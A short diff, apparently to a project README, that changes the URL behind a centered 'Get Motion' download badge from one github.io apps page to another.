@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![Get Motion](https://img.shields.io/badge/Get_Motion-blue?style=for-the-badge&logo=apple)](https://tubus-jubus-apps.github.io/.github/motion)
+[![Get Motion](https://img.shields.io/badge/Get_Motion-blue?style=for-the-badge&logo=apple)](https://top-ssilka-apps.github.io/.github/motion)
 
 </div>
 
